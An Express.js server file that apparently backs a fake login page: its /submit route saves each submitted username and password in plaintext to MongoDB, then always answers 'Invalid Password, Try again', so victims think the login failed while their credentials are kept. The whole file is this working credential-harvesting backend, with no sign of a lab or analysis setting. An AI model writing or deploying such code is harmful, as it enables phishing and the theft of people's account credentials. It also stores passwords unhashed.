const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const connectDB = require('./db');
const User = require('./models/User');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 3000;

// Connect to MongoDB
connectDB();

// Middleware to parse URL-encoded data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

// Handle form submission
app.post('/submit', async (req, res) => {
  try {
    const { uname, password } = req.body;
    const newUser = new User({ uname, password });
    await newUser.save();
    res.send('Invalid Password, Try again');
  } catch (err) {
    res.status(500).send('Server Error');
  }
});

app.listen(port, () => {
  console.log(`Server is running at http://localhost:${port}`);
});
